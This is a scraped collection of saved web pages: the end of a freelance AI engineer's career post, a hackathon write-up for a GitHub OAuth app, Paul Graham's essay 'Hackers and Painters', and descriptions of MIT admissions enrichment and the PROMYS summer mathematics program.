here with a huge grain of salt,\nbut I don\u2019t think there\u2019s any huge difference between being a sole proprietor\nand being a single-member LLC, unless you screw something up (e.g., being sued\nby your client) or you are hugely successful (e.g., being acquired by a\ncompany, making millions of dollars per year, or you grow a team of a dozen\nemployees).\n\nI think the US is a great place to be a freelancer, even for an immigrant non-\nnative English speaker like me. Being a legal permanent resident makes it\neasier to work with US-based clients, who usually pay better. The legal system\nis at least decent. Filing an LLC is just a matter of going to the state\nsecretary\u2019s website and filling out a form, if you know what you are doing. On\nthe contrary, even thinking about incorporating in Japan, for example, makes\nme shudder, even though I am from Japan. You need to hand in a certificate of\nyour corporate seal, a copy of your corporate bank passbook, along with the\ncompany registration in a floppy disk or a CD-R. I think their government has\nsome work to do before they even think about their \u201cnational AI strategies.\u201d\n\nA downside of being a US-based freelancer is medical insurance. I continued my\nprevious employer\u2019s health plan using COBRA and switched over to a plan that I\nbought on the state marketplace when I moved. Be prepared to pay at least a\ncouple hundred dollars more per month on premiums than you\u2019d pay as a full-\ntime employee.\n\nRead [Working for Yourself\u2014Law & Taxes for Independent Contractors,\nFreelancers & Gig Workers of All\nTypes](https://store.nolo.com/products/working-for-yourself-wage.html) from\nNolo before you start. I read this book literally cover to cover before I got\nstarted, which was worth every single penny. Check out [some of\ntheir](https://store.nolo.com/products/nolos-guide-to-single-member-llcs-\nsmllc.html) [related books](https://store.nolo.com/products/your-limited-\nliability-company-lop.html), too. They are also good.\n\nI can\u2019t say much about taxes, because this April will be the first tax filing\nseason since I became independent. I discussed my options thoroughly with my\nCPA before I took the jump. I keep track of my business income and expenses on\na Google Spreadsheet. I\u2019m not sure if this is a good idea. At the least, don\u2019t\nforget to pay quarterly estimated taxes.\n\n## Summary\n\nIn this post, I showed that a freelance AI engineer can be a viable career\npath. You need to understand that this is a very qualified statement and your\nmileage may vary. Don\u2019t get mad at me even if you go independent and go broke.\nIf you are interested in knowing more, have any questions or feedback, [shoot\nme an email](mailto:hagisan@gmail.com).

So\nwe decided to build something that would allow them to quickly sign up with\nOauth and almost instantly have their data on display. ## What it does Reposi\nis a GitHub Oauth app that efficiently pulls your repository data from your\nGitHub profile and displays it beautifully with an iframe. It allows coders to\nquickly integrate their websites with their repositories with a simple plugin\nand script. ## How we built it We used a flask backend with an SQLite database\nconnected to GitHub Oauth to link our users' data and provide it quickly. We\nalso learned about how to store session data to keep track of logins. ##\nChallenges we ran into Same Source Origin Policy made it very difficult for us\nto style the iframe and it's content. We also had some difficulties connecting\nour server backend to the github oauth api but managed to complete the link at\nthe end. ## Accomplishments that we're proud of Creating an innovative way of\nteaching security to others by implanting easter eggs in our source code.\nCreating a production-level interace that has a lot to offer and will not only\nbe useful for us but for developers looking for a quick plug-and-play\nsolution. ## What we learned We've learned it's a bit hard to collaborate on a\nsingle project, we needed to manage merge conflicts and we also had schedule\nconflicts considering we live in 3 different timezones. ## What's next for\nReposi We almost completed the implementation of GitLab support but a last-\nminute bug prevented us from deploying that feature.

A lot of people seemed surprised that someone interested in\ncomputers would also be interested in painting. They seemed to think that\nhacking and painting were very different kinds of work-- that hacking was\ncold, precise, and methodical, and that painting was the frenzied expression\nof some primal urge.  \n  \nBoth of these images are wrong. Hacking and painting have a lot in common. In\nfact, of all the different types of people I've known, hackers and painters\nare among the most alike.  \n  \nWhat hackers and painters have in common is that they're both makers. Along\nwith composers, architects, and writers, what hackers and painters are trying\nto do is make good things. They're not doing research per se, though if in the\ncourse of trying to make good things they discover some new technique, so much\nthe better.  \n  \n  \n  \nI've never liked the term \"computer science.\" The main reason I don't like it\nis that there's no such thing. Computer science is a grab bag of tenuously\nrelated areas thrown together by an accident of history, like Yugoslavia. At\none end you have people who are really mathematicians, but call what they're\ndoing computer science so they can get DARPA grants. In the middle you have\npeople working on something like the natural history of computers-- studying\nthe behavior of algorithms for routing data through networks, for example. And\nthen at the other extreme you have the hackers, who are trying to write\ninteresting software, and for whom computers are just a medium of expression,\nas concrete is for architects or paint for painters. It's as if\nmathematicians, physicists, and architects all had to be in the same\ndepartment.  \n  \nSometimes what the hackers do is called \"software engineering,\" but this term\nis just as misleading. Good software designers are no more engineers than\narchitects are. The border between architecture and engineering is not sharply\ndefined, but it's there. It falls between what and how: architects decide what\nto do, and engineers figure out how to do it.  \n  \nWhat and how should not be kept too separate. You're asking for trouble if you\ntry to decide what to do without understanding how to do it. But hacking can\ncertainly be more than just deciding how to implement some spec. At its best,\nit's creating the spec-- though it turns out the best way to do that is to\nimplement it.  \n  \n  \n  \nPerhaps one day \"computer science\" will, like Yugoslavia, get broken up into\nits component parts. That might be a good thing. Especially if it meant\nindependence for my native land, hacking.  \n  \nBundling all these different types of work together in one department may be\nconvenient administratively, but it's confusing intellectually. That's the\nother reason I don't like the name \"computer science.\" Arguably the people in\nthe middle are doing something like an experimental science. But the people at\neither end, the hackers and the mathematicians, are not actually doing\nscience.  \n  \nThe mathematicians don't seem bothered by this. They happily set to work\nproving theorems like the other mathematicians over in the math department,\nand probably soon stop noticing that the building they work in says ``computer\nscience'' on the outside. But for the hackers this label is a problem. If what\nthey're doing is called science, it makes them feel they ought to be acting\nscientific. So instead of doing what they really want to do, which is to\ndesign beautiful software, hackers in universities and research labs feel they\nought to be writing research papers.  \n  \nIn the best case, the papers are just a formality. Hackers write cool\nsoftware, and then write a paper about it, and the paper becomes a proxy for\nthe achievement represented by the software. But often this mismatch causes\nproblems. It's easy to drift away from building beautiful things toward\nbuilding ugly things that make more suitable subjects for research papers.  \n  \nUnfortunately, beautiful things don't always make the best subjects for\npapers. Number one, research must be original-- and as anyone who has written\na PhD dissertation knows, the way to be sure that you're exploring virgin\nterritory is to to stake out a piece of ground that no one wants. Number two,\nresearch must be substantial-- and awkward systems yield meatier papers,\nbecause you can write about the obstacles you have to overcome in order to get\nthings done. Nothing yields meaty problems like starting with the wrong\nassumptions. Most of AI is an example of this rule; if you assume that\nknowledge can be represented as a list of predicate logic expressions whose\narguments represent abstract concepts, you'll have a lot of papers to write\nabout how to make this work. As Ricky Ricardo used to say, \"Lucy, you got a\nlot of explaining to do.\"  \n  \nThe way to create something beautiful is often to make subtle tweaks to\nsomething that already exists, or to combine existing ideas in a slightly new\nway. This kind of work is hard to convey in a research paper.  \n  \n  \n  \nSo why do universities and research labs continue to judge hackers by\npublications? For the same reason that \"scholastic aptitude\" gets measured by\nsimple-minded standardized tests, or the productivity of programmers gets\nmeasured in lines of code. These tests are easy to apply, and there is nothing\nso tempting as an easy test that kind of works.  \n  \nMeasuring what hackers are actually trying to do, designing beautiful\nsoftware, would be much more difficult. You need a good [sense of\ndesign](taste.html) to judge good design  \n---  \n. And there is no correlation, except possibly a\n[negative](http://www.apa.org/journals/features/psp7761121.pdf) one, between\npeople's ability to recognize good design and their confidence that they can.  \n  \nThe only external test is time. Over time, beautiful things tend to thrive,\nand ugly things tend to get discarded. Unfortunately, the amounts of time\ninvolved can be longer than human lifetimes. Samuel Johnson said it took a\nhundred years for a writer's reputation to converge. You have to wait for the\nwriter's influential friends to die, and then for all their followers to die.  \n  \nI think hackers just have to resign themselves to having a large random\ncomponent in their reputations. In this they are no different from other\nmakers. In fact, they're lucky by comparison. The influence of fashion is not\nnearly so great in hacking as it is in painting.  \n  \n  \n  \nThere are worse things than having people misunderstand your work. A worse\ndanger is that you will yourself misunderstand your work. Related fields are\nwhere you go looking for ideas. If you find yourself in the computer science\ndepartment, there is a natural temptation to believe, for example, that\nhacking is the applied version of what theoretical computer science is the\ntheory of. All the time I was in graduate school I had an uncomfortable\nfeeling in the back of my mind that I ought to know more theory, and that it\nwas very remiss of me to have forgotten all that stuff within three weeks of\nthe final exam.  \n  \nNow I realize I was mistaken. Hackers need to understand the theory of\ncomputation about as much as painters need to understand paint chemistry. You\nneed to know how to calculate time and space complexity and about Turing\ncompleteness. You might also want to remember at least the concept of a state\nmachine, in case you have to write a parser or a regular expression library.\nPainters in fact have to remember a good deal more about paint chemistry than\nthat.  \n  \nI've found that the best sources of ideas are not the other fields that have\nthe word \"computer\" in their names, but the other fields inhabited by makers.\nPainting has been a much richer source of ideas than the theory of\ncomputation.  \n  \nFor example, I was taught in college that one ought to figure out a program\ncompletely on paper before even going near a computer. I found that I did not\nprogram this way. I found that I liked to program sitting in front of a\ncomputer, not a piece of paper. Worse still, instead of patiently writing out\na complete program and assuring myself it was correct, I tended to just spew\nout code that was hopelessly broken, and gradually beat it into shape.\nDebugging, I was taught, was a kind of final pass where you caught typos and\noversights. The way I worked, it seemed like programming consisted of\ndebugging.  \n  \nFor a long time I felt bad about this, just as I once felt bad that I didn't\nhold my pencil the way they taught me to in elementary school. If I had only\nlooked over at the other makers, the painters or the architects, I would have\nrealized that there was a name for what I was doing: sketching. As far as I\ncan tell, the way they taught me to program in college was all wrong. You\nshould figure out programs as you're writing them, just as writers and\npainters and architects do.  \n  \nRealizing this has real implications for software design. It means that a\nprogramming language should, above all, be malleable. A programming language\nis for [thinking](piraha.html) of programs, not for expressing programs you've\nalready thought of. It should be a pencil, not a pen. Static typing would be a\nfine idea if people actually did write programs the way they taught me to in\ncollege. But that's not how any of the hackers I know write programs. We need\na language that lets us scribble and smudge and smear, not a language where\nyou have to sit with a teacup of types balanced on your knee and make polite\nconversation with a strict old aunt of a compiler.  \n  \n  \n  \nWhile we're on the subject of static typing, identifying with the makers will\nsave us from another problem that afflicts the sciences: math envy. Everyone\nin the sciences secretly believes that mathematicians are smarter than they\nare. I think mathematicians also believe this. At any rate, the result is that\nscientists tend to make their work look as mathematical as possible. In a\nfield like physics this probably doesn't do much harm, but the further you get\nfrom the natural sciences, the more of a problem it becomes.  \n  \nA page of formulas just looks so impressive. (Tip: for extra impressiveness,\nuse Greek variables.) And so there is a great temptation to work on problems\nyou can treat formally, rather than problems that are, say, important.  \n  \nIf hackers identified with other makers, like writers and painters, they\nwouldn't feel tempted to do this. Writers and painters don't suffer from math\nenvy. They feel as if they're doing something completely unrelated. So are\nhackers, I think.  \n  \n  \n  \nIf universities and research labs keep hackers from doing the kind of work\nthey want to do, perhaps the place for them is in companies. Unfortunately,\nmost companies won't let hackers do what they want either. Universities and\nresearch labs force hackers to be scientists, and companies force them to be\nengineers.  \n  \nI only discovered this myself quite recently. When Yahoo bought Viaweb, they\nasked me what I wanted to do. I had never liked the business side very much,\nand said that I just wanted to hack. When I got to Yahoo, I found that what\nhacking meant to them was implementing software, not designing it. Programmers\nwere seen as technicians who translated the visions (if that is the word) of\nproduct managers into code.  \n  \nThis seems to be the default plan in big companies. They do it because it\ndecreases the standard deviation of the outcome. Only a small percentage of\nhackers can actually design software, and it's hard for the people running a\ncompany to pick these out. So instead of entrusting the future of the software\nto one brilliant hacker, most companies set things up so that it is designed\nby committee, and the hackers merely implement the design.  \n  \nIf you want to make money at some point, remember this, because this is one of\nthe reasons startups win. Big companies want to decrease the standard\ndeviation of design outcomes because they want to avoid disasters. But when\nyou damp oscillations, you lose the high points as well as the low. This is\nnot a problem for big companies, because they don't win by making great\nproducts. Big companies win by sucking less than other big companies.  \n  \nSo if you can figure out a way to get in a design war with a company big\nenough that its software is designed by product managers, they'll never be\nable to keep up with you. These opportunities are not easy to find, though.\nIt's hard to engage a big company in a design war, just as it's hard to engage\nan opponent inside a castle in hand to hand combat. It would be pretty easy to\nwrite a better word processor than Microsoft Word, for example, but Microsoft,\nwithin the castle of their operating system monopoly, probably wouldn't even\nnotice if you did.  \n  \nThe place to fight design wars is in new markets, where no one has yet managed\nto establish any fortifications. That's where you can win big by taking the\nbold approach to design, and having the same people both design and implement\nthe product. Microsoft themselves did this at the start. So did Apple. And\nHewlett-Packard. I suspect almost every successful startup has.  \n  \n  \n  \nSo one way to build great software is to start your own startup. There are two\nproblems with this, though. One is that in a startup you have to do so much\nbesides write software. At Viaweb I considered myself lucky if I got to hack a\nquarter of the time. And the things I had to do the other three quarters of\nthe time ranged from tedious to terrifying. I have a benchmark for this,\nbecause I once had to leave a board meeting to have some cavities filled. I\nremember sitting back in the dentist's chair, waiting for the drill, and\nfeeling like I was on vacation.  \n  \nThe other problem with startups is that there is not much overlap between the\nkind of software that makes money and the kind that's interesting to write.\nProgramming languages are interesting to write, and Microsoft's first product\nwas one, in fact, but no one will pay for programming languages now. If you\nwant to make money, you tend to be forced to work on problems that are too\nnasty for anyone to solve for free.  \n  \nAll makers face this problem. Prices are determined by supply and demand, and\nthere is just not as much demand for things that are fun to work on as there\nis for things that solve the mundane problems of individual customers. Acting\nin off-Broadway plays just doesn't pay as well as wearing a gorilla suit in\nsomeone's booth at a trade show. Writing novels doesn't pay as well as writing\nad copy for garbage disposals. And hacking programming languages doesn't pay\nas well as figuring out how to connect some company's legacy database to their\nWeb server.  \n  \n  \n  \nI think the answer to this problem, in the case of software, is a concept\nknown to nearly all makers: the day job. This phrase began with musicians, who\nperform at night. More generally, it means that you have one kind of work you\ndo for money, and another for love.  \n  \nNearly all makers have day jobs early in their careers. Painters and writers\nnotoriously do. If you're lucky you can get a day job that's closely related\nto your real work. Musicians often seem to work in record stores. A hacker\nworking on some programming language or operating system might likewise be\nable to get a day job using it. [1]  \n  \nWhen I say that the answer is for hackers to have day jobs, and work on\nbeautiful software on the side, I'm not proposing this as a new idea. This is\nwhat open-source hacking is all about. What I'm saying is that open-source is\nprobably the right model, because it has been independently confirmed by all\nthe other makers.  \n  \nIt seems surprising to me that any employer would be reluctant to let hackers\nwork on open-source projects. At Viaweb, we would have been reluctant to hire\nanyone who didn't. When we interviewed programmers, the main thing we cared\nabout was what kind of software they wrote in their spare time. You can't do\nanything really well unless you love it, and if you love to hack you'll\ninevitably be working on projects of your own. [2]  \n  \n  \n  \nBecause hackers are makers rather than scientists, the right place to look for\nmetaphors is not in the sciences, but among other kinds of makers. What else\ncan painting teach us about hacking?  \n  \nOne thing we can learn, or at least confirm, from the example of painting is\nhow to learn to hack. You learn to paint mostly by doing it. Ditto for\nhacking. Most hackers don't learn to hack by taking college courses in\nprogramming. They learn to hack by writing programs of their own at age\nthirteen. Even in college classes, you learn to hack mostly by hacking. [3]  \n  \nBecause painters leave a trail of work behind them, you can watch them learn\nby doing. If you look at the work of a painter in chronological order, you'll\nfind that each painting builds on things that have been learned in previous\nones. When there's something in a painting that works very well, you can\nusually find version 1 of it in a smaller form in some earlier painting.  \n  \nI think most makers work this way. Writers and architects seem to as well.\nMaybe it would be good for hackers to act more like painters, and regularly\nstart over from scratch, instead of continuing to work for years on one\nproject, and trying to incorporate all their later ideas as revisions.  \n  \nThe fact that hackers learn to hack by doing it is another sign of how\ndifferent hacking is from the sciences. Scientists don't learn science by\ndoing it, but by doing labs and problem sets. Scientists start out doing work\nthat's perfect, in the sense that they're just trying to reproduce work\nsomeone else has already done for them. Eventually, they get to the point\nwhere they can do original work. Whereas hackers, from the start, are doing\noriginal work; it's just very bad. So hackers start original, and get good,\nand scientists start good, and get original.  \n  \n  \n  \nThe other way makers learn is from examples. For a painter, a museum is a\nreference library of techniques. For hundreds of years it has been part of the\ntraditional education of painters to copy the works of the great masters,\nbecause copying forces you to look closely at the way a painting is made.  \n  \nWriters do this too. Benjamin Franklin learned to write by summarizing the\npoints in the essays of Addison and Steele and then trying to reproduce them.\nRaymond Chandler did the same thing with detective stories.  \n  \nHackers, likewise, can learn to program by looking at good programs-- not just\nat what they do, but the source code too. One of the less publicized benefits\nof the open-source movement is that it has made it easier to learn to program.\nWhen I learned to program, we had to rely mostly on examples in books. The one\nbig chunk of code available then was Unix, but even this was not open source.\nMost of the people who read the source read it in illicit photocopies of John\nLions' book, which though written in 1977 was not allowed to be published\nuntil 1996.  \n  \n  \n  \nAnother example we can take from painting is the way that paintings are\ncreated by gradual refinement. Paintings usually begin with a sketch.\nGradually the details get filled in. But it is not merely a process of filling\nin. Sometimes the original plans turn out to be mistaken. Countless paintings,\nwhen you look at them in xrays, turn out to have limbs that have been moved or\nfacial features that have been readjusted.  \n  \nHere's a case where we can learn from painting. I think hacking should work\nthis way too. It's unrealistic to expect that the specifications for a program\nwill be perfect. You're better off if you admit this up front, and write\nprograms in a way that allows specifications to change on the fly.  \n  \n(The structure of large companies makes this hard for them to do, so here is\nanother place where startups have an advantage.)  \n  \nEveryone by now presumably knows about the danger of premature optimization. I\nthink we should be just as worried about premature design-- deciding too early\nwhat a program should do.  \n  \nThe right tools can help us avoid this danger. A good programming language\nshould, like oil paint, make it easy to change your mind. Dynamic typing is a\nwin here because you don't have to commit to specific data representations up\nfront. But the key to flexibility, I think, is to make the language very\n[abstract](power.html). The easiest program to change is one that's very\nshort.  \n  \n  \n  \nThis sounds like a paradox, but a great painting has to be better than it has\nto be. For example, when Leonardo painted the portrait of [Ginevra de\nBenci](ginevra.html) in the National Gallery, he put a juniper bush behind her\nhead. In it he carefully painted each individual leaf. Many painters might\nhave thought, this is just something to put in the background to frame her\nhead. No one will look that closely at it.  \n  \nNot Leonardo. How hard he worked on part of a painting didn't depend at all on\nhow closely he expected anyone to look at it. He was like Michael Jordan.\nRelentless.  \n  \nRelentlessness wins because, in the aggregate, unseen details become visible.\nWhen people walk by the portrait of Ginevra de Benci, their attention is often\nimmediately arrested by it, even before they look at the label and notice that\nit says Leonardo da Vinci. All those unseen details combine to produce\nsomething that's just stunning, like a thousand barely audible voices all\nsinging in tune.  \n  \nGreat software, likewise, requires a fanatical devotion to beauty. If you look\ninside good software, you find that parts no one is ever supposed to see are\nbeautiful too. I'm not claiming I write great software, but I know that when\nit comes to code I behave in a way that would make me eligible for\nprescription drugs if I approached everyday life the same way. It drives me\ncrazy to see code that's badly indented, or that uses ugly variable names.  \n  \n  \n  \nIf a hacker were a mere implementor, turning a spec into code, then he could\njust work his way through it from one end to the other like someone digging a\nditch. But if the hacker is a creator, we have to take inspiration into\naccount.  \n  \nIn hacking, like painting, work comes in cycles. Sometimes you get excited\nabout some new project and you want to work sixteen hours a day on it. Other\ntimes nothing seems interesting.  \n  \nTo do good work you have to take these cycles into account, because they're\naffected by how you react to them. When you're driving a car with a manual\ntransmission on a hill, you have to back off the clutch sometimes to avoid\nstalling. Backing off can likewise prevent ambition from stalling. In both\npainting and hacking there are some tasks that are terrifyingly ambitious, and\nothers that are comfortingly routine. It's a good idea to save some easy tasks\nfor moments when you would otherwise stall.  \n  \nIn hacking, this can literally mean saving up bugs. I like debugging: it's the\none time that hacking is as straightforward as people think it is. You have a\ntotally constrained problem, and all you have to do is solve it. Your program\nis supposed to do x. Instead it does y. Where does it go wrong? You know\nyou're going to win in the end. It's as relaxing as painting a wall.  \n  \n  \n  \nThe example of painting can teach us not only how to manage our own work, but\nhow to work together. A lot of the great art of the past is the work of\nmultiple hands, though there may only be one name on the wall next to it in\nthe museum. Leonardo was an apprentice in the workshop of Verrocchio and\npainted one of the angels in his [Baptism of Christ](baptism.html). This sort\nof thing was the rule, not the exception. Michelangelo was considered\nespecially dedicated for insisting on painting all the figures on the ceiling\nof the Sistine Chapel himself.  \n  \nAs far as I know, when painters worked together on a painting, they never\nworked on the same parts. It was common for the master to paint the principal\nfigures and for assistants to paint the others and the background. But you\nnever had one guy painting over the work of another.  \n  \nI think this is the right model for collaboration in software too. Don't push\nit too far. When a piece of code is being hacked by three or four different\npeople, no one of whom really owns it, it will end up being like a common-\nroom. It will tend to feel bleak and abandoned, and accumulate cruft. The\nright way to collaborate, I think, is to divide projects into sharply defined\nmodules, each with a definite owner, and with interfaces between them that are\nas carefully designed and, if possible, as articulated as programming\nlanguages.  \n  \n  \n  \nLike painting, most software is intended for a human audience. And so hackers,\nlike painters, must have empathy to do really great work. You have to be able\nto see things from the user's point of view.  \n  \nWhen I was a kid I was always being told to look at things from someone else's\npoint of view. What this always meant in practice was to do what someone else\nwanted, instead of what I wanted. This of course gave empathy a bad name, and\nI made a point of not cultivating it.  \n  \nBoy, was I wrong. It turns out that looking at things from other people's\npoint of view is practically the secret of success. It doesn't necessarily\nmean being self-sacrificing. Far from it. Understanding how someone else sees\nthings doesn't imply that you'll act in his interest; in some situations-- in\nwar, for example-- you want to do exactly the opposite. [4]  \n  \nMost makers make things for a human audience. And to engage an audience you\nhave to understand what they need. Nearly all the greatest paintings are\npaintings of people, for example, because people are what people are\ninterested in.  \n  \nEmpathy is probably the single most important difference between a good hacker\nand a great one. Some hackers are quite smart, but when it comes to empathy\nare practically solipsists. It's hard for such people to design great software\n[5], because they can't see things from the user's point of view.  \n  \nOne way to tell how good people are at empathy is to watch them explain a\ntechnical question to someone without a technical background. We probably all\nknow people who, though otherwise smart, are just comically bad at this. If\nsomeone asks them at a dinner party what a programming language is, they'll\nsay something like ``Oh, a high-level language is what the compiler uses as\ninput to generate object code.'' High-level language? Compiler? Object code?\nSomeone who doesn't know what a programming language is obviously doesn't know\nwhat these things are, either.  \n  \nPart of what software has to do is explain itself. So to write good software\nyou have to understand how little users understand. They're going to walk up\nto the software with no preparation, and it had better do what they guess it\nwill, because they're not going to read the manual. The best system I've ever\nseen in this respect was the original Macintosh, in 1985. It did what software\nalmost never does: it just worked. [6]  \n  \nSource code, too, should explain itself. If I could get people to remember\njust one quote about programming, it would be the one at the beginning of\n_Structure and Interpretation of Computer Programs._\n\n> Programs should be written for people to read, and only incidentally for\n> machines to execute.\n\nYou need to have empathy not just for your users, but for your readers. It's\nin your interest, because you'll be one of them. Many a hacker has written a\nprogram only to find on returning to it six months later that he has no idea\nhow it works. I know several people who've sworn off Perl after such\nexperiences. [7]  \n  \nLack of empathy is associated with intelligence, to the point that there is\neven something of a fashion for it in some places. But I don't think there's\nany correlation. You can do well in math and the natural sciences without\nhaving to learn empathy, and people in these fields tend to be smart, so the\ntwo qualities have come to be associated. But there are plenty of dumb people\nwho are bad at empathy too. Just listen to the people who call in with\nquestions on talk shows. They ask whatever it is they're asking in such a\nroundabout way that the hosts often have to rephrase the question for them.  \n  \n  \n  \nSo, if hacking works like painting and writing, is it as cool? After all, you\nonly get one life. You might as well spend it working on something great.  \n  \nUnfortunately, the question is hard to answer. There is always a big time lag\nin prestige. It's like light from a distant star. Painting has prestige now\nbecause of great work people did five hundred years ago. At the time, no one\nthought these paintings were as important as we do today. It would have seemed\nvery odd to people at the time that Federico da Montefeltro, the Duke of\nUrbino, would one day be known mostly as the guy with the strange nose in a\n[painting](montefeltro.html) by Piero della Francesca.  \n  \nSo while I admit that hacking doesn't seem as cool as painting now, we should\nremember that painting itself didn't seem as cool in its glory days as it does\nnow.  \n  \nWhat we can say with some confidence is that these are the glory days of\nhacking. In most fields the great work is done early on. The paintings made\nbetween 1430 and 1500 are still unsurpassed. Shakespeare appeared just as\nprofessional theater was being born,  and pushed the medium so far that every\nplaywright since has had to live in his shadow. Albrecht Durer did the same\nthing with engraving, and Jane Austen with the novel.  \n  \nOver and over we see the same pattern. A new medium appears, and people are so\nexcited about it that they explore most of its possibilities in the first\ncouple generations. Hacking seems to be in this phase now.  \n  \nPainting was not, in Leonardo's time, as cool as his work helped make it. How\ncool hacking turns out to be will depend on what we can do with this new\nmedium.  \n  \n  \n  \n  \n**Notes**  \n  \n[1] The greatest damage that photography has done to painting may be the fact\nthat it killed the best day job. Most of the great painters in history\nsupported themselves by painting portraits.  \n  \n[2] I've been told that Microsoft discourages employees from contributing to\nopen-source projects, even in their spare time. But so many of the best\nhackers work on open-source projects now that the main effect of this policy\nmay be to ensure that they won't be able to hire any first-rate programmers.  \n  \n[3] What you learn about programming in college is much like what you learn\nabout books or clothes or dating: what bad taste you had in high school.  \n  \n[4] Here's an example of applied empathy. At Viaweb, if we couldn't decide\nbetween two alternatives, we'd ask, what would our competitors hate most? At\none point a competitor added a feature to their software that was basically\nuseless, but since it was one of few they had that we didn't, they made much\nof it in the trade press. We could have tried to explain that the feature was\nuseless, but we decided it would annoy our competitor more if we just\nimplemented it ourselves, so we hacked together our own version that\nafternoon.  \n  \n[5] Except text editors and compilers. Hackers don't need empathy to design\nthese, because they are themselves typical users.  \n  \n[6] Well, almost. They overshot the available RAM somewhat, causing much\ninconvenient disk swapping, but this could be fixed within a few months by\nbuying an additional disk drive.  \n  \n[7] The way to make programs easy to read is not to stuff them with comments.\nI would take Abelson and Sussman's quote a step further. Programming languages\nshould be designed to express algorithms, and only incidentally to tell\ncomputers how to execute them. A good programming language ought to be better\nfor explaining software than English. You should only need comments when there\nis some kind of kludge you need to warn readers about, just as on a road there\nare only arrows on parts with unexpectedly sharp curves.  \n  \n**Thanks** to Trevor Blackwell, Robert Morris, Dan Giffin, and Lisa Randall\nfor reading drafts of this, and to Henry Leitner and Larry Finkelstein for\ninviting me to speak.  \n  \n  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n---  \n![](http://ep.yimg.com/ca/I/paulgraham_2271_5194)|\n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)| [Japanese\nTranslation](http://www.shiro.dreamhost.com/scheme/trans/hp-j.html)  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n| ![](http://ep.yimg.com/ca/Img/trans_1x1.gif)|\n![](http://ep.yimg.com/ca/I/paulgraham_2271_5194)|\n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)| [Spanish\nTranslation](http://kapcoweb.com/p/hackers-y-pintores)  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n![](http://ep.yimg.com/ca/I/paulgraham_2271_5194)|\n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)| [German\nTranslation](http://www.langatigma.org/trans/hm.html)  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n| ![](http://ep.yimg.com/ca/Img/trans_1x1.gif)|\n![](http://ep.yimg.com/ca/I/paulgraham_2271_5194)|\n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)| [Portuguese\nTranslation](http://www.sounerd.com.br/index.php?option=com_content&task=view&id=203&Itemid=43)  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n![](http://ep.yimg.com/ca/I/paulgraham_2271_5194)|\n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)| [Czech\nTranslation](http://blog.zvestov.cz/item/135)  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n| ![](http://ep.yimg.com/ca/Img/trans_1x1.gif)|\n![](http://ep.yimg.com/ca/I/paulgraham_2271_5194)|\n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)| [Why Good Design Comes from Bad\nDesign](http://www.uiweb.com/issues/issue08.htm)  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n![](http://ep.yimg.com/ca/I/paulgraham_2271_5194)|\n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)| [Knuth: Computer Programming as\nan Art](knuth.html)  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n  \n![](http://ep.yimg.com/ca/Img/trans_1x1.gif)  \n  \n  \n  \n\n* * *\n\n| ![](http://www.virtumundo.com/images/spacer.gif) You'll find this essay and\n14 others in [**_Hackers &\nPainters_**](http://www.amazon.com/gp/product/0596006624).  \n![](http://www.virtumundo.com/images/spacer.gif)\n\n", "title": "Hackers and Painters", "date": "04/08/20", "tags": []}, "12": {"type": "bookmark", "url": "http://mitadmissions.org/apply/prepare/enrichment", "desc": "If you are seriously interested in MIT, you probably think math and science are serious fun.", "content": "Skip to content \u2193\n\n## COVID-19\n\nLearn more about how MIT Admissions is responding to COVID-19 in this [blog\npost from our Dean](https://mitadmissions.org/blogs/entry/to-our-prospective-\nstudents-and-their-families/) and new [dedicated\nFAQs](https://mitadmissions.org/help/faq-topic/covid-19/).\n\nSearch Pages, Blogs, and FAQs for\n\nSubmit Search\n\n  1.

Each summer,\napproximately 80 high school students from around the country gather on the\ncampus of Boston University for six weeks of rigorous mathematical activity.\nThrough their intensive efforts to solve an assortment of unusually\nchallenging problems in Number Theory, participants will practice the art of\nmathematical discovery. The problem sets encourage students to design their\nown numerical experiments and to employ their own powers of analysis to\ndiscover mathematical patterns, formulate and test conjectures, and justify\ntheir ideas by devising their own mathematical proofs.\n\nStudents are advised by resident counselors: junior counselors who have just\ngraduated high school and undergraduate counselors who are embarking on their\nown mathematical careers at some of the finest universities (over half attend\nHarvard, MIT, or Princeton). In addition, the returning students, who share\ndormitory rooms with the first-year students, are a constant source of helpful\nhints and suggestions. Senior mathematicians are a constant resource providing\nmathematical support and encouragement to the students.\n\nThe emphasis at PROMYS is on asking good and creative questions, on hard work\nand persistence, on clarity of thought and precision of expression, on respect\nfor people and ideas, and on the sheer joy of acquiring mathematical insight.\nPROMYS participants are asked to work beyond their centers of competence and\nto push the limits of their knowledge. The PROMYS community network provides\nall participants with a richly supportive environment within which to learn.\n\n## Advanced Seminars and the Clay Mathematics Institute\n\nStudents who find their PROMYS experience especially worthwhile may be invited\nto return for a second summer to participate in the advanced PROMYS/CMI\nactivities. To ensure that returning students and counselors find their\nexperience intellectually stimulating, PROMYS, in partnership with the [Clay\nMathematics Institute](/about-promys/partners#CMI), offers a variety of\n[advanced seminars](/program/cmi) and [mentored research\nprojects](/program/research \"Mentored research\") each summer. In 2017,\nreturning students participated in seminars on The Analytic Class Number\nFormula, Algebra, and Geometry and Symmetry.\n\n## Supplementary Lectures and Seminars\n\nThe regular program activities are supplemented by diverse weekly lectures by\nfaculty preceptors and guests of the program. These lectures introduce\nparticipants to related scientific fields and include discussions of a broad\nrange of mathematical and math-related topics. Recent guest lecture topics\nincluded, for example, \"The Schoenflies Conjecture and Morse Theory,\" \"High-\nDimensional Mathematics,\" and 